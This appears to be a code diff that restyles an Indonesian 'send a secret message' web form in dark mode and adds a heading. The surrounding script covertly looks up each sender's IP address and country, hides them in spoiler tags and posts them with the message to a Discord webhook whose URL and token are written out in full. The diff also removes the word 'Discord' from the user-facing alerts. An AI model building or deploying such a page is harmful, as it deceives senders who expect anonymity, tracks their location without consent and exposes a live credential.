@@ -10,29 +10,35 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background-color: #f0f0f0;
+      background-color: #121212; /* Background gelap */
       margin: 0;
       font-family: Arial, sans-serif;
+      color: #ffffff; /* Warna teks putih untuk kontras */
     }
     .form-container {
-      background-color: white;
+      background-color: #1e1e1e; /* Warna kotak form lebih terang sedikit dari background */
       padding: 20px;
       border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+      text-align: center;
+    }
+    .form-container h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #ffffff;
     }
     .form-container textarea {
       width: 100%;
       margin-bottom: 10px;
       padding: 10px;
-      border: 1px solid #ccc;
+      border: 1px solid #333333;
       border-radius: 4px;
       font-size: 16px;
+      background-color: #2c2c2c; /* Warna latar belakang teks area */
+      color: #ffffff; /* Warna teks putih */
     }
-    .form-container textarea[name="nama"] {
-      height: 40px;
-    }
-    .form-container textarea[name="pesan"] {
-      height: 100px;
+    .form-container textarea::placeholder {
+      color: #aaaaaa; /* Warna placeholder */
     }
     .form-container button {
       width: 100%;
@@ -51,6 +57,7 @@
 </head>
 <body>
   <div class="form-container">
+    <h1>Kirimkan Pesan Rahasia</h1>
     <textarea name="nama" id="nama" placeholder="Masukkan nama"></textarea>
     <textarea name="pesan" id="pesan" placeholder="Masukkan pesan"></textarea>
     <button type="submit" onclick="sendMessage()">Enter</button>
@@ -91,12 +98,10 @@
       const ip = await getIP();
       const country = await getCountryByIP(ip);
 
-      
       const message = {
         content: `||IP: ${ip}\nCountry: ${country}||\n\nFrom: \`${nama}\`\nText: \`${pesan}\``
       };
 
-      
       fetch('https://discord.com/api/webhooks/1327200149134381096/pmlY151E4nuSjjOoL_foHu2XlWt7HQw3XxunzsNlfdJ1WSY_IHTjC4_AjXfuyFPYEfCv', {
         method: 'POST',
         headers: {
@@ -106,9 +111,9 @@
       })
       .then(response => {
         if (response.ok) {
-          alert('Pesan berhasil dikirim ke Discord!');
+          alert('Pesan berhasil dikirim!');
         } else {
-          alert('Gagal mengirim pesan ke Discord.');
+          alert('Gagal mengirim pesan.');
         }
       })
       .catch(error => {
